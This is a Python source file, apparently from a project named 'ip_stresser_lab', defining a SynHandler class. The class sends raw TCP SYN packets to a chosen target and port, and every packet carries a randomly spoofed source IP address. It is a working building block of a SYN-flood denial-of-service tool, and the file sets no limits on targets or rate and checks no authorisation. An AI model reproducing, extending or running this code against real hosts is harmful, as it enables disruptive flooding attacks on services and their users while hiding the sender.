"""Raw TCP SYN sender. Windows requires admin + Npcap; Linux needs CAP_NET_RAW."""
from __future__ import annotations

import socket
from ip_stresser_lab.services.packet_builder import ip_header, random_ipv4, tcp_syn_header


class SynHandler:
    def __init__(self) -> None:
        self._sock: socket.socket | None = None

    def open(self) -> None:
        if self._sock is None:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self._sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    async def send(self, target: str, port: int) -> tuple[int, int]:
        if self._sock is None:
            self.open()
        src = random_ipv4()
        syn = tcp_syn_header(src_port=1024 + (port % 60000), dst_port=port)
        pkt = ip_header(src, target, proto=6, payload_len=len(syn)) + syn
        try:
            self._sock.sendto(pkt, (target, port))  # type: ignore[union-attr]
            return 1, len(pkt)
        except OSError:
            return 0, 0

    def close(self) -> None:
        if self._sock is not None:
            self._sock.close()
            self._sock = None